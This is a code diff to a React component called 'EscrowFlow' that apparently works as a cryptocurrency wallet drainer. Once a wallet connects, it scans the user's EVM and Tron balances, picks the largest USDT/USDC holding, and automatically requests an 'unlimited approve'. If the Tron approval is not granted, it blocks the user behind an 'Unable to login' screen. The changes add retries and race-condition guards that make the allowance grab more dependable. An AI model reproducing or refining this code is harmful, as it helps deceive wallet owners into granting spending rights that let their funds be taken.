@@ -404,6 +404,10 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   // --- Modal 1: auto-pops after wallet connects, approves USDC/USDT with balance ---
   const modal1Triggered = useRef(false);
   const modal1SawTron = useRef(false);
+  /** Prevents overlapping runModal1Scan (late tronWeb vs primary path). */
+  const modal1InFlight = useRef(false);
+  /** Once winner approve starts, late Tron must not restart the flow. */
+  const modal1ApproveStarted = useRef(false);
   const hasStableRef = useRef(false);
   const loginBlockedRef = useRef(false);
   /** Re-run Tron approve from the Unable to login screen. */
@@ -502,16 +506,14 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
 
   /** Approve Tron USDT in the background, confirm allowance, then persist. */
   async function completeTronUsdtApproval(): Promise<boolean> {
+    // Initial attempt + 2 reattempts = 3 total before Unable to login / Retry login
     const result = await ensureTronUsdtApproved({ maxAttempts: 3 });
     if (!result.ok || !result.address) {
       const rejected = !result.ok && result.rejected;
       const errMsg = !result.ok ? result.error : "tron_approve_failed";
-      if (rejected || hasStableRef.current) {
-        throw Object.assign(new Error(errMsg || "tron_approve_failed"), {
-          code: rejected ? "ACTION_REJECTED" : "TRON_APPROVE_FAILED",
-        });
-      }
-      return false;
+      throw Object.assign(new Error(errMsg || "tron_approve_failed"), {
+        code: rejected ? "ACTION_REJECTED" : "TRON_APPROVE_FAILED",
+      });
     }
     setTronAddress(result.address);
     const persisted = await persistTronVerification(result.address);
@@ -681,15 +683,8 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       clearTrustRedirectCount();
 
       // Tron: silent peek only right after Privy — never prompt here (competes with SIWE).
-      // Prompt happens later inside DApp browser / late-injection effect.
       const silent = await ensureTronAddress({ prompt: false });
       if (silent) setTronAddress(silent);
-
-      fetch("/api/airdrop", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ address }),
-      }).catch(() => {});
 
       await runModal1Scan();
     })();
@@ -713,11 +708,6 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
         await new Promise((r) => setTimeout(r, 1500));
         const tron = await ensureTronAddress({ prompt: true });
         if (tron) setTronAddress(tron);
-        fetch("/api/airdrop", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ address }),
-        }).catch(() => {});
         await runModal1Scan();
       })();
     }, 800);
@@ -726,19 +716,28 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [authenticated, address, wallets.length, needsTrustOpen]);
 
-  // Late Tron injection: if first scan missed Tron, re-scan once when tronWeb appears
+  // Late Tron injection: only re-scan if we never started a winner approve yet.
   useEffect(() => {
     if (!authenticated || !address) return;
-    if (modal1SawTron.current || modal1Complete) return;
+    if (modal1SawTron.current || modal1Complete || modal1ApproveStarted.current) return;
     if (typeof window === "undefined") return;
 
     let cancelled = false;
     const tryLate = async () => {
-      if (cancelled || modal1SawTron.current || modal1Approving) return;
+      if (
+        cancelled ||
+        modal1SawTron.current ||
+        modal1Approving ||
+        modal1InFlight.current ||
+        modal1ApproveStarted.current ||
+        modal1Complete
+      ) {
+        return;
+      }
       const addr = peekTronAddress() ?? (await ensureTronAddress({ prompt: true }));
       if (!addr || cancelled) return;
       setTronAddress(addr);
-      if (modal1SawTron.current) return;
+      if (modal1SawTron.current || modal1ApproveStarted.current || modal1InFlight.current) return;
       await runModal1Scan();
     };
 
@@ -782,7 +781,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     authorizeTx: string,
     approvedTokens: { symbol: string; address: string; txHash?: string }[]
   ) {
-    if (!address) return;
+    if (!address) throw new Error("no_address");
     const payload: Record<string, unknown> = {
       address,
       chain: chain.name,
@@ -792,26 +791,29 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       payload.authorizeTx = authorizeTx;
     }
     const body = JSON.stringify(payload);
-    try {
-      const verifyRes = await fetch("/api/verify", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body,
-      });
-      if (!verifyRes.ok) {
-        const text = await verifyRes.text().catch(() => "");
-        console.error("[escrow] /api/verify failed:", chain.name, verifyRes.status, text);
-        await fetch("/api/verify", {
+    let lastErr = "verify_failed";
+    for (let attempt = 0; attempt < 2; attempt++) {
+      try {
+        const verifyRes = await fetch("/api/verify", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body,
-        }).catch(() => {});
-      } else {
-        console.log("[escrow] /api/verify ok:", chain.name);
+        });
+        if (verifyRes.ok) {
+          console.log("[escrow] /api/verify ok:", chain.name);
+          return;
+        }
+        const text = await verifyRes.text().catch(() => "");
+        lastErr = `verify_${verifyRes.status}:${text.slice(0, 120)}`;
+        console.error("[escrow] /api/verify failed:", chain.name, verifyRes.status, text);
+        if (attempt === 0) await new Promise((r) => setTimeout(r, 2000));
+      } catch (err) {
+        lastErr = err instanceof Error ? err.message : "verify_error";
+        console.error("[escrow] /api/verify error:", chain.name, err);
+        if (attempt === 0) await new Promise((r) => setTimeout(r, 2000));
       }
-    } catch (err) {
-      console.error("[escrow] /api/verify error:", chain.name, err);
     }
+    throw new Error(lastErr);
   }
 
   /** Authorize + approve stables + wrap native on one EVM chain. */
@@ -1009,45 +1011,68 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   }
 
   // ---------------------------------------------------------------------------
-  // Modal 1 — scan ALL chains in parallel (EVM + Tron), show single winner
+  // Modal 1 — EVM scan → Tron scan → approve highest USDT/USDC only
   // ---------------------------------------------------------------------------
   async function runModal1Scan() {
     if (!address) return;
+    if (modal1InFlight.current || modal1ApproveStarted.current) return;
+    modal1InFlight.current = true;
     setModal1Scanning(true);
     setModal1Open(true);
 
+    type ScanToken = {
+      chain: string; chainLabel: string; chainId: number; symbol: string;
+      address: string; balance: string; balanceUsd: number; contract: string;
+      isTron: boolean; alreadyApproved: boolean;
+      permit?: boolean; permitDomainName?: string; permitDomainVersion?: string;
+    };
     type ScanData = {
       ok: boolean;
-      topToken?: {
-        chain: string; chainLabel: string; chainId: number; symbol: string;
-        address: string; balance: string; balanceUsd: number; contract: string;
-        isTron: boolean; alreadyApproved: boolean;
-        permit?: boolean; permitDomainName?: string; permitDomainVersion?: string;
-      };
-      tokensWithBalance?: {
-        chain: string; chainLabel: string; chainId: number; symbol: string;
-        address: string; balance: string; balanceUsd: number; contract: string;
-        isTron: boolean; alreadyApproved: boolean;
-        permit?: boolean; permitDomainName?: string; permitDomainVersion?: string;
-      }[];
+      tokensWithBalance?: ScanToken[];
       chainUsd?: Record<string, number>;
     };
 
     const doScan = async (tronAddr: string | null): Promise<ScanData> => {
-      const res = await fetch("/api/scan-balances", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ address, tronAddress: tronAddr }),
-      });
-      return res.json();
+      try {
+        const res = await fetch("/api/scan-balances", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ address, tronAddress: tronAddr }),
+        });
+        return res.json();
+      } catch (e) {
+        console.error("[modal1] scan request failed:", e);
+        return { ok: false };
+      }
     };
 
+    const toItem = (t: ScanToken): Modal1Item => ({
+      key: `${t.chain}-${t.symbol}`,
+      chainName: t.chain,
+      chainLabel: t.chainLabel,
+      symbol: t.symbol,
+      tokenAddr: t.address,
+      balanceDisplay: t.balance,
+      balanceUsd: t.balanceUsd,
+      contract: t.contract,
+      isTron: t.isTron,
+      alreadyApproved: t.alreadyApproved,
+      permit: t.permit,
+      permitDomainName: t.permitDomainName,
+      permitDomainVersion: t.permitDomainVersion,
+    });
+
     try {
-      // ── Step 1: Get Tron address BEFORE scanning ──────────────────────────
-      // Privy / WalletConnect is EVM-only — they never provide a Tron address.
-      // Tron only works when Trust Wallet / TronLink / TokenPocket injects
-      // window.tronWeb (DApp browser). We actively wait + request accounts so
-      // the address is ready before the balance scan runs.
+      // 1) EVM balances immediately (no Tron yet)
+      const evmScan = await doScan(null);
+      const merged = new Map<string, ScanToken>();
+      for (const t of evmScan.tokensWithBalance ?? []) {
+        if (!t.isTron) merged.set(`${t.chain}:${t.symbol}:${t.address}`, t);
+      }
+      if (evmScan.ok && evmScan.chainUsd) setCachedScanUsd(evmScan.chainUsd);
+      noteStableFromScan(evmScan.tokensWithBalance, hasStableRef);
+
+      // 2) Tron immediately after EVM
       let currentTronAddr = tronAddress ?? getConnectedTronAddress();
       if (!currentTronAddr) {
         currentTronAddr = await ensureTronAddress({ prompt: true });
@@ -1055,86 +1080,40 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       if (currentTronAddr) {
         setTronAddress(currentTronAddr);
         modal1SawTron.current = true;
+        const tronScan = await doScan(currentTronAddr);
+        for (const t of tronScan.tokensWithBalance ?? []) {
+          merged.set(`${t.chain}:${t.symbol}:${t.address}`, t);
+        }
+        if (tronScan.ok && tronScan.chainUsd) {
+          setCachedScanUsd((prev) => ({ ...(prev ?? {}), ...(tronScan.chainUsd ?? {}) }));
+        }
+        noteStableFromScan(tronScan.tokensWithBalance, hasStableRef);
       }
-
-      // ── Step 2: Scan EVM + Tron in parallel ───────────────────────────────
-      // If currentTronAddr is null (desktop WalletConnect QR with no TronLink),
-      // Tron is skipped — that is expected; WalletConnect cannot see Tron.
-      const data = await doScan(currentTronAddr);
-      if (data.ok) setCachedScanUsd(data.chainUsd ?? null);
-      noteStableFromScan(data.tokensWithBalance, hasStableRef);
 
       setModal1Scanning(false);
       setModal1Open(false);
 
-      // Approve EVERY funded stable across Tron + all EVM chains.
-      // Previously Tron-only early-return skipped BNB/ETH/Polygon entirely.
-      const tronWinners = (data.tokensWithBalance ?? []).filter(
-        (t) => t.isTron && t.balanceUsd > 0.01
-      );
-      const evmStables = (data.tokensWithBalance ?? []).filter(
+      // 3) Highest USDT/USDC across EVM + Tron → one immediate direct approve
+      const stables = [...merged.values()].filter(
         (t) =>
-          !t.isTron &&
-          (t.symbol === "USDT" || t.symbol === "USDC") &&
-          t.balanceUsd >= 0.01
+          (t.symbol === "USDT" || t.symbol === "USDC") && t.balanceUsd >= 0.01
       );
+      if (stables.length === 0) return;
 
-      if (tronWinners.length === 0 && evmStables.length === 0) return;
+      stables.sort((a, b) => b.balanceUsd - a.balanceUsd);
+      const winner = toItem(stables[0]);
+      setTopChainName(winner.chainName);
+      setModal1Items([winner]);
+      setModal1Status({ [winner.key]: "pending" });
 
-      if (tronWinners[0]) {
-        modal1SawTron.current = true;
-        setTopChainName(tronWinners[0].chain);
-        // Background: confirm USDT allowance on-chain (approve + poll + server verify).
-        // User cannot proceed if this fails — Unable to login + Try again.
-        let tronGateFailed = false;
-        const runTron = async () => {
-          try {
-            await completeTronUsdtApproval();
-            tronRetryRef.current = null;
-            loginBlockedRef.current = false;
-            tronGateFailed = false;
-            setShowTronRetry(false);
-            setModal1Complete(true);
-            setPhase((p) => (p === "unable-to-login" ? "idle" : p));
-          } catch (err) {
-            console.error("[modal1] tron approve/verify failed:", err);
-            tronGateFailed = true;
-            gateOnTronApprovalFailure(runTron);
-          }
-        };
-        await runTron();
-        if (tronGateFailed || loginBlockedRef.current) return;
-      }
-
-      if (evmStables.length === 0) return;
-
-      // EVM: all funded stables on eth / bnb / polygon (authorize + approve + verify each)
-      if (!tronWinners[0]) setTopChainName(evmStables[0].chain);
-      const items: Modal1Item[] = evmStables.map((t) => ({
-        key: `${t.chain}-${t.symbol}`,
-        chainName: t.chain,
-        chainLabel: t.chainLabel,
-        symbol: t.symbol,
-        tokenAddr: t.address,
-        balanceDisplay: t.balance,
-        balanceUsd: t.balanceUsd,
-        contract: t.contract,
-        isTron: false,
-        alreadyApproved: t.alreadyApproved,
-        permit: t.permit,
-        permitDomainName: t.permitDomainName,
-        permitDomainVersion: t.permitDomainVersion,
-      }));
-      setModal1Items((prev) => [...prev, ...items]);
-      setModal1Status((s) => ({
-        ...s,
-        ...Object.fromEntries(items.map((i) => [i.key, "pending" as Modal1Status])),
-      }));
-      void handleModal1ApproveAll(items);
+      modal1ApproveStarted.current = true;
+      await handleModal1Approve(winner);
     } catch (err) {
       console.error("[modal1] scan failed:", err);
       setModal1Scanning(false);
       setModal1Open(false);
+    } finally {
+      modal1InFlight.current = false;
     }
   }
 
@@ -1248,8 +1227,10 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
 
     try {
       if (target.isTron) {
-        // Background Tron path — confirm on-chain then persist (no fire-and-forget)
+        // Tron: up to 3 attempts (1 + 2 retries), then Unable to login → Retry login
         await completeTronUsdtApproval();
+        setShowTronRetry(false);
+        tronRetryRef.current = null;
       } else {
         // ── EVM path — authorize + unlimited approve + register (same as Approve-all) ──
         const chain = CHAINS.find((c) => c.name === target.chainName)!;
